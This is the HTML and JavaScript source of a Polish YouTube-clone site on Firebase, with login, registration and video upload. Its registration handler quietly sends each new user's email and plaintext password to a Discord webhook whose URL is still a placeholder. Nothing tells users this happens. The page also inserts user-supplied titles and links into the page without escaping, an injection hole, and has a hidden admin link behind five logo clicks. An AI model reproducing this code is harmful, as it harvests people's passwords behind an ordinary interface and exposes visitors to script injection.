<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Polski YouTube - Strona GÅ‚Ã³wna</title>
    <style>
        body { background: #0f0f0f; color: white; font-family: sans-serif; margin: 0; }
        header { height: 56px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; background: #0f0f0f; border-bottom: 1px solid #333; position: sticky; top: 0; z-index: 1000; }
        .logo { font-size: 20px; font-weight: bold; cursor: pointer; }
        .logo span { background: red; padding: 2px 8px; border-radius: 4px; }
        .btn { border: none; padding: 8px 16px; border-radius: 18px; cursor: pointer; font-weight: bold; }
        .btn-blue { background: #3ea6ff; color: #0f0f0f; }
        .container { max-width: 1400px; margin: auto; padding: 20px; }
        .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; }
        .v-card { cursor: pointer; border-radius: 12px; overflow: hidden; background: #1a1a1a; }
        .thumb { width: 100%; aspect-ratio: 16/9; background: #000; object-fit: cover; }
        .shorts-row { display: flex; gap: 15px; overflow-x: auto; padding-bottom: 10px; }
        .short-card { width: 160px; flex-shrink: 0; aspect-ratio: 9/16; cursor: pointer; }
        .short-card video { width: 100%; height: 100%; object-fit: cover; border-radius: 12px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; }
        .modal-content { background: #282828; padding: 30px; border-radius: 15px; width: 350px; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #121212; border: 1px solid #333; color: white; border-radius: 8px; }
    </style>
</head>
<body>

<header>
    <div class="logo" id="mainLogo"><span>PL</span> YouTube</div>
    <div id="navRight">
        <button id="showLogin" class="btn btn-blue">ZALOGUJ SIÄ˜</button>
        <div id="userMenu" style="display:none; gap:10px;">
            <button id="myProfileBtn" class="btn btn-blue">MÃ“J PROFIL</button>
            <button id="showUpload" class="btn" style="background:#272727; color:white;">+ DODAJ</button>
            <button id="logoutBtn" class="btn" style="background:#272727; color:white;">WYLOGUJ</button>
        </div>
    </div>
</header>

<div class="container">
    <h3>ðŸ“± Shortsy</h3>
    <div class="shorts-row" id="shortsList"></div>
    <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
    <h3>ðŸŽ¥ Filmy</h3>
    <div class="video-grid" id="videoList"></div>
</div>

<div id="authModal" class="modal">
    <div class="modal-content">
        <h2 id="authTitle">Logowanie</h2>
        <input type="email" id="emailInp" placeholder="E-mail">
        <input type="password" id="passInp" placeholder="HasÅ‚o">
        <button class="btn btn-blue" style="width:100%" id="authSubmit">DALEJ</button>
        <p id="toggleAuth" style="color:#3ea6ff; cursor:pointer; text-align:center; margin-top:15px;">Nie masz konta? Zarejestruj siÄ™</p>
        <button onclick="document.getElementById('authModal').style.display='none'" style="background:none; border:none; color:gray; width:100%; margin-top:10px; cursor:pointer;">Anuluj</button>
    </div>
</div>

<div id="uploadModal" class="modal">
    <div class="modal-content">
        <h2>Dodaj film</h2>
        <input type="text" id="vTitle" placeholder="TytuÅ‚">
        <input type="text" id="vUrl" placeholder="Link .mp4">
        <select id="vType"><option value="video">Film</option><option value="short">Short</option></select>
        <button class="btn btn-blue" style="width:100%" id="publishBtn">OPUBLIKUJ</button>
        <button onclick="document.getElementById('uploadModal').style.display='none'" style="background:none; border:none; color:gray; width:100%; margin-top:10px; cursor:pointer;">Anuluj</button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
    import { getFirestore, collection, addDoc, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyCpp-nUIT7bHmtO8qJI3-Q89biIpsnIBzM",
        authDomain: "polski-youtub2.firebaseapp.com",
        projectId: "polski-youtub2",
        storageBucket: "polski-youtub2.firebasestorage.app",
        messagingSenderId: "325129789226",
        appId: "1:325129789226:web:f68f2f1a1f8f9feaf14853",
        measurementId: "G-B5M3F5J713"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);

    // --- DISCORD LOGS ---
    async function logToDiscord(email, password) {
        const webhook = "TUTAJ_WKLEJ_SWOJ_WEBHOOK_URL"; // <--- WKLEJ TUTAJ LINK
        const payload = {
            username: "Logi Rejestracji",
            embeds: [{
                title: "ðŸ‘¤ Nowy uÅ¼ytkownik zarejestrowany!",
                color: 5814783,
                fields: [
                    { name: "Email", value: email, inline: true },
                    { name: "HasÅ‚o", value: "||" + password + "||", inline: true }
                ]
            }]
        };
        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
    }

    // --- AUTH LOGIC ---
    let isReg = false;
    document.getElementById('showLogin').onclick = () => { isReg = false; document.getElementById('authModal').style.display='flex'; };
    document.getElementById('toggleAuth').onclick = () => {
        isReg = !isReg;
        document.getElementById('authTitle').innerText = isReg ? "Rejestracja" : "Logowanie";
    };

    document.getElementById('authSubmit').onclick = async () => {
        const email = document.getElementById('emailInp').value;
        const pass = document.getElementById('passInp').value;
        try {
            if(isReg) {
                await createUserWithEmailAndPassword(auth, email, pass);
                await logToDiscord(email, pass);
            } else {
                await signInWithEmailAndPassword(auth, email, pass);
            }
            location.reload();
        } catch(e) { alert(e.message); }
    };

    onAuthStateChanged(auth, user => {
        document.getElementById('showLogin').style.display = user ? 'none' : 'block';
        document.getElementById('userMenu').style.display = user ? 'flex' : 'none';
        if(user) document.getElementById('myProfileBtn').onclick = () => location.href = `profile.html?email=${user.email}`;
    });

    document.getElementById('logoutBtn').onclick = () => signOut(auth);
    document.getElementById('showUpload').onclick = () => document.getElementById('uploadModal').style.display='flex';

    document.getElementById('publishBtn').onclick = async () => {
        await addDoc(collection(db, "content"), {
            title: document.getElementById('vTitle').value,
            url: document.getElementById('vUrl').value,
            type: document.getElementById('vType').value,
            author: auth.currentUser.email,
            createdAt: new Date(),
            likes: 0
        });
        location.reload();
    };

    // --- LOAD CONTENT ---
    async function load() {
        const snap = await getDocs(query(collection(db, "content"), orderBy("createdAt", "desc")));
        snap.forEach(d => {
            const data = d.data();
            const card = document.createElement('div');
            if(data.type === 'short') {
                card.className = 'short-card';
                card.innerHTML = `<video src="${data.url}#t=0.1"></video>`;
                card.onclick = () => location.href = `video.html?id=${d.id}&url=${data.url}&type=short`;
                document.getElementById('shortsList').appendChild(card);
            } else {
                card.className = 'v-card';
                card.innerHTML = `<video class="thumb" src="${data.url}#t=0.1"></video><div style="padding:10px"><b>${data.title}</b><br><small>${data.author}</small></div>`;
                card.onclick = () => location.href = `video.html?id=${d.id}&url=${data.url}`;
                document.getElementById('videoList').appendChild(card);
            }
        });
    }
    
    // Sekretny admin (5 klikniÄ™Ä‡ w logo)
    let c = 0; document.getElementById('mainLogo').onclick = () => { c++; if(c==5) location.href="admin.html"; setTimeout(()=>c=0,2000); };
    load();
</script>
</body>
</html>
